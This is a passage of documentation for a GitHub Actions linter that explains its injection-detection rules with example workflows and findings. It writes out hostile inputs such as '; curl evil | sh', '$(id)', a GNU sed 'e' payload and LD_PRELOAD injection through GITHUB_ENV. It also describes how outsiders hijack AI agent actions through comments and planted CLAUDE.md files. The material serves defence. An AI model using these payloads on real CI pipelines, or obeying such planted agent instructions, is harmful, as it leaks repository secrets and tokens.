[Playground](https://jactionlint.jdx.dev/#eNqMkLFu8zAMhHc/xSH4V/sBtP9DgY7ZDclmYrUqKVBUAiPIuxd2nLYomqKbxDviPp6wa4Cz6OshybkfY8nehmkZApFztXJ7AxYt0f0D2JzJoZhGPm7DUedWK3/3BJFEnhtAKUuJJjp/SWpeJKwhRsVuu1q5tMIONVS22ia/aKtUjPIHUrs4HWiYBLt/l8tG3K2ouF53j3zHaFMNHZ2IrRtSJLY++zmJH7ugnofpD9tKh579269BG9DWzEPn/mn//P8uAcSnzxKBVXX44cD3AQAr74WJ)

**What is reported.**

- `inputs.*` and `github.event.inputs.*` of a `workflow_dispatch` workflow (anyone with write access can type anything), of a reusable workflow (whatever the caller passes, which may be an attacker controlled value of the caller) and of a composite action. An input of the type `boolean`, `number`, `choice` or `environment` is a fixed vocabulary and is not reported;
- `github.event.client_payload.*`, which the sender of a `repository_dispatch` event chooses;
- `github.event.release.tag_name`, `name`, `body` and `target_commitish`, and the names of the release assets;
- `github.ref_name`, `github.base_ref` and `github.event.pull_request.base.ref`: a branch or tag name can hold shell syntax such as `a$(cmd)`, and anyone with write access can create one;
- text that the list of [untrusted properties](#untrusted-inputs) lacks and an outsider types: the previous title and text of an edited issue or pull request (`github.event.changes.title.from`, `changes.body.from`, and `changes.base.ref.from`, the branch the pull request had), `github.event.pull_request.head.repo.homepage` (the website of the fork, which its owner types), the title of the pages of a `gollum` event (`github.event.pages[*].title`, like `page_name`), and the message and the author's name of the commit of a merge queue (`github.event.merge_group.head_commit.message`, `.author.name`), which holds the title and the text of the pull requests;
- in a workflow started by `workflow_run`, the path of the workflow file that started it: `github.event.workflow_run.path`, `github.event.workflow.path` and `github.event.workflow_run.referenced_workflows[*].path`. A pull request from a fork can add a workflow file with any name (`$(cmd).yaml` is a valid file name), and GitHub fills the path from it. In other workflows the path is not reported (`github.event.workflow` of a `workflow_dispatch` is the file that someone with write access chose).

**What is not reported.**

- `github.event.changes.head.ref.from`: no payload has the field;
- `github.event.merge_group.head_commit.author.email` and `.committer.*`: the commit is made by the queue of GitHub and an email is one that an account verified, so there is no evidence that an outsider chooses them;
- `github.event.merge_group.head_ref`: a name that the queue makes;
- `github.actor`, SHAs, numbers and the IDs of events: GitHub restricts their characters;
- `steps.*.outputs.*`, `needs.*.outputs.*`, `matrix.*` and `env.*`: they are values of the workflow itself.

The option `pedantic` of the rule reports all of these like every other `${{ }}` in a script: see [expansions in scripts](#check-template-injection-expansion).

**Fix.** The fix is the one of [script injection](#untrusted-inputs): pass the value through an environment variable and read it as a variable of the shell.

<a id="check-template-injection-expansion"></a>
## Expansions in scripts (pedantic)

The option `pedantic` of the rule `template-injection` reports every other `${{ }}` in a script, not only the contexts that an attacker controls. The value is pasted into the source of the script before it runs, so a value with quotes, `$(...)` or a newline changes the script. This holds for a `run:` script, for the `script` of github-script and for the [inputs that run as code](#untrusted-inputs-through-objects-environment-variables-and-action-inputs).

The option reports two kinds of values:

- Values that are free text: `steps.*.outputs.*`, `needs.*.outputs.*`, `matrix.*` with values from `fromJSON` and `env.*` set from an expression. (Free text inputs and `github.ref_name` are reported by the `default` profile: see [Inputs, payloads, release names and branch names](#check-template-injection-inputs).)
- Values that an attacker cannot control: `github.repository`, `github.sha`, `runner.*`, `secrets.*`, `vars.*`, boolean, number and choice inputs, a matrix whose values are written in the workflow, enumerations like `needs.*.result`, and expressions which only test a context. This is the "everything is a code smell" view: a value that cannot be attacked still breaks when somebody later changes it to something that can. The pedantic persona of zizmor takes the same view, see [zizmor parity](./zizmor-parity.md).

The option is on under the `pedantic` profile and off otherwise, and you can set it for the rule alone. Both kinds are fixed like [script injection](#untrusted-inputs), except an expression that only tests a context (`github.event_name == 'push'`), which has no fix. They are the findings that the retired rules `template-injection-expansion` and `template-injection-trusted` reported: an ignore of one of those IDs still works for its kind and prints a deprecation warning.

Example input:

```yaml
# select: template-injection
on: workflow_dispatch

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - id: version
        run: echo "tag=v1" >> "$GITHUB_OUTPUT"
      # The value of a step output is part of the script
      - run: ./release.sh '${{ steps.version.outputs.tag }}'
      # An environment variable is not
      - run: ./release.sh "$TAG"
        env:
          TAG: ${{ steps.version.outputs.tag }}
      # The value cannot be controlled by an attacker, but it is still a ${{ }} in a script
      - run: echo "Building ${{ github.repository }}"
```

Example config:

```yaml
rules:
  template-injection:
    pedantic: true
```

Output:

```
test.yaml:11:32: "steps.version.outputs.tag" is expanded with ${{ }} into an inline script, so a value with shell syntax changes what the script does. instead, pass it through an environment variable and read it as a variable of the shell [template-injection]
   |
11 |       - run: ./release.sh '${{ steps.version.outputs.tag }}'
   |                                ^~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:17:33: "github.repository" is expanded with ${{ }} into an inline script. its value is not controlled by an attacker, but an expansion in a script is easy to get wrong when the script changes. instead, read it as a variable of the shell [template-injection]
   |
17 |       - run: echo "Building ${{ github.repository }}"
   |                                 ^~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule: `--profile pedantic --select template-injection` gives it on a file with the same content.

To enable the option, use the `pedantic` profile or set it in `rules` of the [configuration file](./config.md#rules):

```yaml
rules:
  template-injection:
    pedantic: true
```

What is considered free text is a decision about the value, not the syntax. A boolean input, a matrix of literals and the `result` of a job cannot hold anything but a few words, and a `string` input can hold anything. When you know that a value is safe, set the option to `false` or ignore the line with `# jactionlint ignore=template-injection` (see [ignore findings](./ignore.md#ignore-some-errors)).

<a id="check-github-env"></a>
## Dangerous writes to `GITHUB_ENV` and `GITHUB_PATH`

The rule `github-env` (default profile) reports a write to `$GITHUB_ENV` or `$GITHUB_PATH` of a value that an outsider can control: input that an outsider writes, or, in a workflow started by `pull_request_target` or `workflow_run`, a value that is not a literal.

Example input:

```yaml
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "VERSION=$(cat version.txt)" >> "$GITHUB_ENV"
      - run: echo "TITLE=$TITLE" >> "$GITHUB_ENV"
        env:
          TITLE: ${{ github.event.pull_request.title }}
```

Output:

```
test.yaml:8:48: a value that is not a literal is written to $GITHUB_ENV in a workflow triggered by "pull_request_target", which runs with secrets and a write token for events that may come from a fork. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. write only literal values and values computed from trusted sources, or pass state with $GITHUB_OUTPUT (only a value without line breaks, or one between a delimiter that nobody can guess, is safe there: see output-clobbering) [github-env]
  |
8 |       - run: echo "VERSION=$(cat version.txt)" >> "$GITHUB_ENV"
  |                                                ^~~~~~~~~~~~~~~~
test.yaml:9:34: untrusted input from the variable TITLE (github.event.pull_request.title) is written to $GITHUB_ENV. an attacker who controls the value can set LD_PRELOAD or NODE_OPTIONS (a newline adds another variable) and run code in the next steps. do not write input that an outsider controls to $GITHUB_ENV; validate it first, or pass it to the next step with $GITHUB_OUTPUT (only a value without line breaks, or one between a delimiter that nobody can guess, is safe there: see output-clobbering) [github-env]
  |
9 |       - run: echo "TITLE=$TITLE" >> "$GITHUB_ENV"
  |                                  ^~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp0z8FKw0AQBuB7n+In5KCH5AEW2oMQNCAVNPYiEpJ2aCPL7LozE5TSd5ckIB7saZj5v/8wgd0KiOZ9m+jTSLTVLh1JpzOg35HE4S1EYjq8rz5CL1PS2+APC0nGUgR2sN5YrfCdkugciVKURQHFJB1ofwrIdtXzS/20Xec3+04xUpIhcKlfepths0GW39fNw+tdW2132X/9pm4eq3U+j6sNgHh0vwswc4f8fMZx0JP1JY3EWv59v9RBPeFy+RkA2itTFQ==)

What a step writes to the file `$GITHUB_ENV` becomes the environment of every later step of the job, and a directory written to `$GITHUB_PATH` is searched for executables first. If an attacker controls what is written, they can run code in the next steps: a value with a newline sets another variable, and `LD_PRELOAD` or `NODE_OPTIONS` load code of their choice, while a directory in front of the `PATH` can shadow a program such as `ssh`. See [Keeping your GitHub Actions and workflows secure: preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/).

**What is reported.** Two kinds of writes:

- A write of something that is not a literal in a workflow started by `pull_request_target` or `workflow_run`. These run with secrets and a write token while the event may come from a fork, so anything computed from the checked out code, its artifacts or the event is suspect. Values that the workflow author or GitHub decide are accepted: literals, the `HOME` and `RUNNER_*` variables, `github.sha`, `github.run_id`, `github.event.pull_request.head.sha`, the `runner`, `matrix`, `vars` and `secrets` contexts, command substitutions of `mktemp`, `date`, `pwd`, `uname` and the like with such arguments, and variables of `env:` or of the script that are set to such values.
- A write of input that an outsider controls, whatever the trigger: an expression such as `github.event.issue.title` or `github.head_ref`, or an environment variable that was set to one (as `TITLE` is in the example; the rule [template-injection](#untrusted-inputs) does not see that one). In the metadata of a composite action, `inputs.*` counts as such an input (also through `env:`): the caller chooses it, and a workflow can pass it the title of an issue. This holds without a calling workflow, because other repositories may use the action.

**Text that a script reads.** A script can also read the text of an outsider itself, and the rule follows it from there. This holds for [command-injection](#check-command-injection), [output-clobbering](#check-output-clobbering) and [argument-injection](#check-argument-injection) as well.

- `gh pr view` and `gh issue view` with a `--json` field that holds free text (`title`, `body`, `comments`, `headRefName`, `files`, `author`, `reviews`, `commits`), as in `TITLE=$(gh pr view "$N" --json title --jq .title)`. Also `gh api repos/.../pulls` and `.../issues` (and their `comments`, `reviews`, `files` and `commits`). Without a `--jq` filter `gh` prints compact JSON, where a line break of a text is written `\n`, so the text counts as one line. A filter prints a string as it is, with its line breaks: a filter that names a property (`.title`, `.body`, `.comments[].body`, `.head.ref`) counts for what it names, and a filter that is not known (`.`, `.comments`, a variable) counts for what the command can print. Only a filter that provably prints a number, a state, a date or a count (`.number`, `.state`, `.comments | length`) clears it.
- `git log` and `git show` with a format that prints the subject, the body or the author (`%s`, `%b`, `%B`, `%an`, `%ae`, `--oneline`), `git diff` and `git diff-tree`, `git branch --show-current`, `git rev-parse --abbrev-ref` and `git symbolic-ref --short`, **once the pull request is checked out**: an earlier step of the job runs `actions/checkout` with a `ref` that names its head, or `gh pr checkout`, or a fetch of `refs/pull/N/head`, or the script did one of these before the command. Without that, the history is the one of the repository and the rule leaves it alone.

These follow the models of [CodeQL](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/untrusted_gh_command.yml) ([git](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/untrusted_git_command.yml)). Only the output of a command substitution counts (`$(...)`), a value that was cut down or checked is accepted as for any other input, and a number or a state is not free text. The message names the command: `untrusted input from the output of "gh pr view --json title" is written to $GITHUB_ENV`.

The name of a branch or of an account that a command prints (`headRefName`, `author`, `git branch --show-current`, `%an`) is one line that git and GitHub restrict. It cannot add a variable to the environment, so `github-env` does not report it, but `command-injection` does: `eval "git checkout $BR"` runs it.

**What is not reported.** A value that cannot carry what makes the write dangerous is accepted. For `$GITHUB_ENV` that is a value without newlines (`tr -d '\n'`, `tr '\n' ' '`, `head -n 1`, `sed ':a;N;$!ba;s/\n/ /g'`, `${v//$'\n'/}`). For both files it is a value cut down to letters, digits and a few harmless characters (`sed 's/[^a-zA-Z0-9-]/-/g'`, `tr -cd 'a-z0-9'`, `${v//[^a-zA-Z0-9]/}`) or checked before the write with an anchored pattern such as `[[ "$v" =~ ^[a-z0-9.-]+$ ]] || exit 1`. A directory for `$GITHUB_PATH` also has to hold no dot, slash or colon.

The check may sit at the top level of the script or inside the same `if` or `else` branch as the write, before it. It then holds for the rest of that branch only. A bare `[[ ]]` that relies on `set -e` is accepted at the top level only, and loops and functions are not followed. A token minted by an earlier step of the job (the `token` output of `actions/create-github-app-token`), the timestamps of the event and the parts of `$GITHUB_REPOSITORY` split with `read` are trusted. `echo "VERSION=1.0" >> "$GITHUB_ENV"` and `echo "$HOME/.cargo/bin" >> "$GITHUB_PATH"` are fine.

**What the rule reads.** It understands `>>` and `>`, `tee`, groups (`{ ...; } >> "$GITHUB_ENV"`), here documents and a file name held in another variable. Scripts of `bash` and `sh` are parsed. For `pwsh`, `powershell` and `cmd` the rule looks at the lines that mention `$env:GITHUB_ENV` or `%GITHUB_ENV%` together with a redirection or `Out-File`, `Add-Content`, `Set-Content` and `Tee-Object`.

**Fix.** Use `$GITHUB_OUTPUT` to pass state between steps (`echo "version=$(cat version.txt)" >> "$GITHUB_OUTPUT"` is not reported) and validate or avoid the value otherwise. `$GITHUB_OUTPUT` is not a safe place for every value either: a value that can hold a line break, such as the body of a comment, adds records of its own there, and a multi-line record with a constant delimiter is no better. [output-clobbering](#check-output-clobbering) reports that.

**Configure.** To turn the rule off, put `github-env: off` in `rules` of the [configuration file](./config.md#rules). To ignore one finding, put `# jactionlint ignore=github-env` on the line before it or at the end of the line: see [ignore findings](./ignore.md#ignore-some-errors).

**Related.** [command-injection](#check-command-injection), [output-clobbering](#check-output-clobbering) and [argument-injection](#check-argument-injection) report other uses of the text of an outsider in a script. [Dangerous triggers](#check-dangerous-triggers) and [untrusted code in privileged workflows](#check-untrusted-checkout) report the workflows that run with secrets while an outsider controls part of the event.

<a id="check-command-injection"></a>
## Input of an outsider that a script runs as code (pedantic)

The rule `command-injection` (pedantic profile) reports input that an outsider controls and that a script runs as code after it was moved to an environment variable, as `bash -c "echo $BODY"` and `eval "$BODY"` do.

Example input:

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: bash -c "echo $BODY"
        env:
          BODY: ${{ github.event.comment.body }}
```

Example config:

```yaml
rules:
  command-injection: warn
```

Output:

```
test.yaml:8:14: warning: untrusted input from the variable BODY (github.event.comment.body) is expanded into the command string of "bash -c", which the shell then parses as code: a value with shell syntax (a ;, a quote or $(...)) runs commands in this step. pass the value as an argument of the command string instead (bash -c 'cmd "$1"' _ "$VALUE"), or validate it against a fixed list or a strict pattern first [command-injection]
  |
8 |       - run: bash -c "echo $BODY"
  |              ^~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule: `--select command-injection` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules); the example config of this section is such an entry.

The usual advice for [template injection](#untrusted-inputs) is to pass the input to the script through `env:` and to read it as `"$BODY"`. That is safe while the shell only expands the variable, and it is not when the script parses the value again. `bash -c "echo $BODY"` builds the command string first and lets a second shell read it, so a comment with `; curl evil | sh` or `$(id)` runs commands in the step, with the token and the secrets of the job. The same holds for `eval "$BODY"`, which runs the value itself. See CodeQL's [command injection query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-078/CommandInjectionCritical.ql).

**What is reported.** An environment variable or a variable of the script that holds input an outsider controls (the same list of inputs as the expression checks, such as `github.event.comment.body`, `github.head_ref` or the title of a pull request) when the script:

- runs it with `eval` or `source <(echo "$BODY")`;
- expands it into the command string of a shell, `bash -c "echo $BODY"`, also behind `sudo`, `docker run image sh -c "..."` and the like;
- uses it as the name of a command (`$CMD`, `"$CMD" --flag`, or `CMD=$(echo "$BODY" | sed ...); $CMD`);
- pipes it into a shell (`echo "$BODY" | bash`, `bash <<< "$BODY"`, `bash <(echo "$BODY")`);
- feeds it to `xargs -I{} sh -c 'echo {}'`, which puts each line into the command string of the shell;
- expands it into the program text of an inline interpreter (`python -c`, `node -e`, `perl -e`, `ruby -e`).

In the script of `actions/github-script` it reports the calls of `child_process` that go through a shell (`exec`, `execSync`, and `spawn`, `execFile` and their sync forms with `shell: true`), a shell started with `-c`, and `exec.exec(...)` when the untrusted value is the program that runs. The value comes from `process.env.NAME` (the step, the job or the workflow set `NAME` to an untrusted expression), from `context.payload.*` or from a constant of the script that holds one of them. An argument in an array (`execFileSync('git', ['log', '--grep', value])`, `exec.exec('git', ['checkout', value])`) is data and is not reported.

**What is not reported.** A plain `"$BODY"` as the argument of a command is not reported (at most that is argument injection), and neither is a value that is only expanded: `bash -c 'echo "$1"' _ "$BODY"`, `bash -c 'echo "$BODY"'` and `eval 'echo "$BODY"'` read the value as data. The rule also accepts a value that the script made safe first:

- checked with an anchored pattern before the use (`[[ "$BODY" =~ ^[a-z0-9-]+$ ]] || exit 1`);
- cut down to letters, digits and a few harmless characters (`tr -cd 'a-z0-9'`, `${BODY//[^a-z0-9]/}`, `sed 's/[^a-zA-Z0-9]/-/g'`);
- quoted for the shell (`printf '%q'`, `${BODY@Q}`);
- turned into a number or a hash (`wc`, `sha256sum`).

A value without newlines is not enough for this rule, because `$(id)` has none. In JavaScript the value is accepted when it is wrapped in a call (`Number(x)`, `shellQuote(x)`), cleaned with `.replace(...)` or tested with an anchored regular expression (`/^[a-z0-9-]+$/.test(x)`) anywhere in the script.

**Limits.** The rule judges variables like [github-env](#check-github-env) does (the last assignment decides, a branch counts together with what was before it), and it starts from the same sources, which include the text that the script reads with `gh pr view` and `git log`: `BR=$(gh pr view "$N" --json headRefName --jq .headRefName); eval "git checkout $BR"` is reported. Three things are left to other rules: an expression written in the script (`eval "${{ github.event.comment.body }}"` is a finding of [template-injection](#untrusted-inputs)), `inputs.*` of a composite action (an action can take a command on purpose), and a value that only the output of a command makes untrusted. The rule does not follow a value through a function of the script (`run() { eval "$1"; }; run "$BODY"`), and it does not parse scripts of `pwsh`, `cmd` and `python`.

**Why it is pedantic.** The rule has no measured false-positive rate yet. Each shape it reports has no harmless reading once the value is text that an outsider writes, so enable it when you want the stricter view.

**Configure.** To turn the rule off, put `command-injection: off` in `rules` of the [configuration file](./config.md#rules). To ignore one finding, put `# jactionlint ignore=command-injection` on the line before it or at the end of the line: see [ignore findings](./ignore.md#ignore-some-errors).

<a id="check-output-clobbering"></a>
## Input of an outsider that adds records to `GITHUB_OUTPUT` (pedantic)

The rule `output-clobbering` (pedantic profile) reports input that an outsider controls and that can hold a line break when a script writes it to `$GITHUB_OUTPUT`, because a line break ends the record and the outsider adds output records of their own.

Example input:

```yaml
# select: output-clobbering
on:
  issue_comment:
    types: [created]
jobs:
  check:
    runs-on: ubuntu-latest
    outputs:
      approved: ${{ steps.gate.outputs.approved }}
    steps:
      - id: gate
        run: |
          echo "approved=false" >> "$GITHUB_OUTPUT"
          echo "body=$BODY" >> "$GITHUB_OUTPUT"
        env:
          BODY: ${{ github.event.comment.body }}
```

Example config:

```yaml
rules:
  output-clobbering: warn
```

Output:

```
test.yaml:14:29: warning: untrusted input from the variable BODY (github.event.comment.body) is written to $GITHUB_OUTPUT as the record "body=..." and can hold a line break: an attacker who controls it ends the record and adds others, so it sets the other outputs of the step (steps.gate.outputs.*) that later steps trust. write a value without line breaks (validate it, or cut it down with tr -d '\n'), or write it between a delimiter that nobody can guess (delimiter=$(uuidgen); echo "body<<$delimiter" ...; echo "$delimiter") [output-clobbering]
   |
14 |           echo "body=$BODY" >> "$GITHUB_OUTPUT"
   |                             ^~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule: `--select output-clobbering` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules):

```yaml
rules:
  output-clobbering: warn
```

The runner reads `$GITHUB_OUTPUT` line by line. A line `name=value` sets an output, so a value that holds a line break ends the record and the rest is read as the next one. A comment whose second line is `approved=true` writes `approved=true` after the `approved=false` that the step wrote on purpose, and a later `if: steps.gate.outputs.approved == 'true'`, or a job that reads `needs.check.outputs.approved`, believes it. This is the same flaw as [`GITHUB_ENV`](#check-github-env) in a form that does not need a variable such as `LD_PRELOAD`. The multi-line form `name<<DELIMITER` has it too when the delimiter is a constant: the value can hold the delimiter on a line of its own and go on with more records. See CodeQL's [output clobbering query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-074/OutputClobberingHigh.ql).

**What is reported.** Input that an outsider controls and that can hold a line break (the same list of inputs as the expression checks, such as the body of an issue, a comment or a review and the message of a commit) when it is written to `$GITHUB_OUTPUT` in a record (`echo "body=$BODY" >> "$GITHUB_OUTPUT"`, `printf`, `tee`, a group or a here document), alone (`echo "$BODY" >> "$GITHUB_OUTPUT"`), or between a constant delimiter. The text that the script reads with `gh` and `git` (see [github-env](#check-github-env)) counts when it can hold several lines, such as the body, the comments or the files of a pull request.

The rule reports only when the output can be misused: the step has an `id` and the job (or the outputs of the action) reads an output of that step other than the one that is written, `steps.gate.outputs.approved` in the example. A step with one output that nothing else reads gives the attacker nothing to change.

**What is not reported.**

- A title, the name of a branch and the name of an account: they are one line.
- `inputs.*` of a composite action.
- A step that only trusted people reach. The rule cannot judge whether the check is enough, so it accepts a step whose `if:` or whose job's `if:` reads `author_association`, the actor or the user of the event, or whose script asks for the permission of the user (`gh api repos/$REPO/collaborators/$USER/permission`).
- A pipeline whose later stage is a program that parses the text (`echo "$BODY" | python parse_args.py >> "$GITHUB_OUTPUT"`): that program decides what is written.
- What other actions write to `$GITHUB_OUTPUT`. An artifact written to it is reported by [untrusted-artifact](#check-untrusted-artifact).
- The workflow command `::set-output` that prints the value.

**How it judges a value.** Where the text is a whole line (nothing constant in front of it, `echo "$BODY" >> "$GITHUB_OUTPUT"`), one line is already a record (`approved=true`), so a later stage that keeps the first line (`head -n 1`) or removes the line breaks (`tr -d '\n'`) does not make it safe. Only a text cut down to letters, digits, `_` and `-` (`tr -cd 'a-z0-9'`), a hash or a checked value does. After a constant name (`body=$BODY`) one line is enough. A delimiter is judged as the shell expands it: the arguments of `printf 'body<<%s\n' "$d"` are followed, a variable that copies a secret or the token (`d=$DELIM` with `DELIM: ${{ secrets.DELIM }}`) is unguessable, and a time such as `date +%s` is not (`date +%s%N` is). The rule judges variables like [github-env](#check-github-env) does.

**Fix.** Write a value without line breaks, or use a delimiter that nobody can guess:

```sh
delimiter=$(uuidgen)
{
  echo "body<<$delimiter"
  echo "$BODY"
  echo "$delimiter"
} >> "$GITHUB_OUTPUT"
```

The rule accepts a delimiter taken from `uuidgen`, `openssl rand`, `/dev/urandom`, `$RANDOM` or `mktemp`, a value that was validated before (`[[ "$BODY" =~ ^[0-9]+$ ]] || exit 1`), the first line (`head -n 1`), a value cut down to a set of characters (`tr -cd`, `${BODY//[^0-9]/}`, `sed 's/[^a-z0-9]/-/g'`), without line breaks (`tr -d '\n'`), or reduced to a number or a hash (`wc`, `sha256sum`, `grep -c`).

**Configure.** To turn the rule off, put `output-clobbering: off` in `rules` of the [configuration file](./config.md#rules). To ignore one finding, put `# jactionlint ignore=output-clobbering` on the line before it or at the end of the line: see [ignore findings](./ignore.md#ignore-some-errors).

<a id="check-argument-injection"></a>
## Free text of an outsider in the program or the options of a command (pedantic)

The rule `argument-injection` (pedantic profile) reports free text that an outsider writes when a script expands it into the program text or into the options of a command such as `sed`, `awk`, `find`, `curl`, `wget` or `git clone`.

Example input:

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  render:
    runs-on: ubuntu-latest
    steps:
      - run: sed "s/PLACEHOLDER/$BODY/g" template.txt > out.txt
        env:
          BODY: ${{ github.event.comment.body }}
```

Example config:

```yaml
rules:
  argument-injection: warn
```

Output:

```
test.yaml:8:14: warning: free text of an outsider from the variable BODY (github.event.comment.body) is expanded into the program of sed: a value with a slash ends the command and the rest is a program of its own. GNU sed runs commands with `e` (`a/g;1e id;#`) and writes files with `w`. keep the value out of the program text: read it from the environment in awk (ENVIRON["BODY"]) or perl ($ENV{BODY}), or cut it down to letters and digits first [argument-injection]
  |
8 |       - run: sed "s/PLACEHOLDER/$BODY/g" template.txt > out.txt
  |              ^~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule: `--select argument-injection` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules); the example config of this section is such an entry.

Passing the input through `env:` makes `"$BODY"` safe as an argument, but not as part of the program that a command reads. In `sed "s/PLACEHOLDER/$BODY/g"` a slash in the value ends the `s` command and the rest is a program of its own: GNU sed runs a command with the `e` command and the `e` flag (`a/g;1e id;#`) and writes files with `w`. The program of `awk` can call `system()`.

`find -exec $BODY` runs the value, an unquoted value in `find` is split into words that can add `-exec`, and a quoted value in the place of a predicate (`find . "$BODY"`, after the first path or after a predicate) is read as a predicate when it starts with a dash (`-delete`, `-exec`). The first path, the operands of the predicates (`-name "$TITLE"`) and the arguments of the command of `-exec` are not such places. For `wget`, `curl` and `git clone` a value that starts a word and starts with a dash is an option: `-o`, `--output`, `--upload-pack`. See CodeQL's [argument injection query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-088/ArgumentInjectionCritical.ql) and [its commands](https://github.com/github/codeql/blob/main/actions/ql/lib/ext/config/argument_injection_sinks.yml).

**What is reported.** Free text that an outsider types (a body, a comment, a title, a commit message, the name of an author, and what a script reads with `gh pr view` and `git log`, see [github-env](#check-github-env)) when it is expanded in the program of `sed` or `awk`, in the words of `find`, or in the options of `curl`, `wget` and `git clone`.

**What is not reported.**

- The name of a branch, of a label and of an account: git does not accept a branch that starts with a dash, and the characters of an account name are fixed.
- A single quoted program (`sed 's/a/$BODY/'`), which does not expand anything.
- The value of `awk -v name="$BODY"`, a pattern (`find -name "$TITLE"`), a value after `--`, and a value in the middle of a word (`"dir/$BODY.tgz"`).
- For the options of `curl`, `wget` and `git clone`, a word that is not an operand (the value of an option, such as `--branch "$BODY"` or `-d "$BODY"`, and a word after `--`), and a value that the script computed first: the value must be the environment variable as the step got it.
- `tar`, `zip`, `unzip` and `rsync`: the rule does not know their options well enough to tell an operand from the value of an option.
- `inputs.*` of a composite action.

The rule does not know who may comment: a command that only maintainers can start is reported like any other. An expression written in the script (`sed "s/a/${{ github.event.comment.body }}/"`) is a finding of [template-injection](#untrusted-inputs).

**Fix.** The only safe shape of a value for a program is letters, digits, `_` and `-`: `tr -cd 'a-z0-9-'`, `${BODY//[^a-z0-9]/}`, `sed 's/[^a-z0-9-]//g'` or a check with an anchored pattern before the use. A dot and a slash are enough to break a sed program. Keep the value out of the program text: read it from the environment in `awk` (`ENVIRON["BODY"]`) or `perl` (`$ENV{BODY}`).

**Configure.** To turn the rule off, put `argument-injection: off` in `rules` of the [configuration file](./config.md#rules). To ignore one finding, put `# jactionlint ignore=argument-injection` on the line before it or at the end of the line: see [ignore findings](./ignore.md#ignore-some-errors).

<a id="check-agentic-actions"></a>
## AI agent actions

The rule `agentic-actions` reports an AI agent action such as Claude Code Action, Gemini CLI or Codex that outsiders can steer, that runs on the code of a pull request, or whose safeguards are switched off. The rule is in the `default` profile and reports at the level `error`.

An agent reads text and then acts with the tools it was given, using the token and the secrets of the job. When an outsider wrote the text (an issue, a comment, the title of a pull request, the files of a pull request), the outsider writes the instructions of the agent. This is the AI form of [script injection](#untrusted-inputs), and it is worse in one respect: there is no escaping that makes text safe for an agent to read, so the remedy is to limit what a hijacked agent can do. For the comparison with zizmor, see [zizmor parity](./zizmor-parity.md).

Example input:

```yaml
on:
  issue_comment:
    types: [created]

permissions:
  contents: write
  issues: write

jobs:
  assist:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.issue.number }}/head
      - uses: anthropics/claude-code-action@v1
        with:
          allowed_non_write_users: '*'
          claude_args: --allowedTools "Bash,Edit"
  summarize:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/run-gemini-cli@v0
        with:
          prompt: Summarize the discussion
```

Output:

```
test.yaml:16:15: Claude Code Action runs in a workspace that holds the code of a pull request (checked out in the step at line 13), and this workflow runs on "issue_comment", with the secrets of the base repository. the agent reads its instructions and configuration from the workspace (files such as CLAUDE.md, AGENTS.md, GEMINI.md, .claude/settings.json, .mcp.json and .gemini/settings.json), so the pull request can add instructions, hooks and tool servers. check out the base branch in the workspace and put the pull request in a subdirectory with "path:" [agentic-actions]
   |
16 |       - uses: anthropics/claude-code-action@v1
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:18:36: "allowed_non_write_users" is "*", so everybody, including users without write access, can start Claude Code Action, although the action checks for write access otherwise. this workflow runs on "issue_comment", which anyone can cause on a public repository, and the text they write steers the agent, and its token can write contents, issues. list the users you trust instead of the wildcard [agentic-actions]
   |
18 |           allowed_non_write_users: '*'
   |                                    ^~~
test.yaml:19:24: Claude Code Action: the allowed tools of Claude Code: "Bash" lets the agent run any shell command. this workflow runs on "issue_comment", so outsiders steer the agent with the text they write. allow only the exact commands that the task needs, and keep the token and the secrets of the job to the minimum [agentic-actions]
   |
19 |           claude_args: --allowedTools "Bash,Edit"
   |                        ^~~~~~~~~~~~~~
test.yaml:23:15: run-gemini-cli does not check who started it, and this workflow runs on "issue_comment", which anyone can cause on a public repository. the text they write steers the agent, which has the secrets of the job, and its token can write contents, issues. restrict the job with an if: on github.event.comment.author_association (OWNER, MEMBER or COLLABORATOR) or on a label that only maintainers add, run it in an environment with required reviewers, or limit the agent to the few tools it needs [agentic-actions]
   |
23 |       - uses: google-github-actions/run-gemini-cli@v0
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

